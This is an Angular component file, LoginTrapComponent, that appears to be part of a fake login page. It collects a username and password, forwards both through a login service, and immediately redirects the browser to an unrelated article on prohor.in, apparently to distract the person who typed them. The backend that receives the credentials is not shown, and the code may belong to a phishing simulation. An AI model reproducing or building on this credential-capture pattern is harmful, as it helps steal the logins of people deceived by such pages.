import { Component, OnInit } from '@angular/core';
import { LoginService } from '../login.service';

@Component({
  selector: 'app-login-trap',
  templateUrl: './login-trap.component.html',
  styleUrls: ['./login-trap.component.css']
})
export class LoginTrapComponent implements OnInit {

  constructor(
    private loginService:LoginService
  ) { }

  public userName : string;
  public password : string;

  ngOnInit(): void {
  }

  sendNotification(){
    location.href = 'https://prohor.in/incident-in-kolkata-over-230-years-ago/';
    this.loginService.sendNotification(this.userName,this.password).subscribe(
      data=>{
        if(data.message == "success"){
          console.log(data);
        }
      },
      err=>{
         console.log(err);
         location.href="/login";
      }
    )
  }

}
